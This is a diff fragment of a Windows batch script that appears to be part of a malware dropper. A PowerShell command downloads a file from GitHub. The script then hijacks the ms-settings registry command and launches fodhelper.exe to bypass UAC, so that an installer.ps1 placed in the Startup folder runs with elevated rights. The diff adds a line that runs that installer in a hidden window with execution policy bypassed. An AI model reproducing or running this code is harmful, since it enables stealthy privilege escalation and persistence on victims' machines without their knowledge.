@@ -24,7 +24,8 @@ powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3
 @echo off
 REM Modify the registry to set the command to run with elevated privileges
 reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /k powershell -ExecutionPolicy Bypass -Command \"& 'C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\installer.ps1'\"" /f
-@rem powershell ./installer.ps1
+powershell -windowstyle hidden -ExcutionPolicy Bypass ./installer.ps1
+
 REM Run fodhelper.exe to trigger the elevated command
 start fodhelper.exe
 
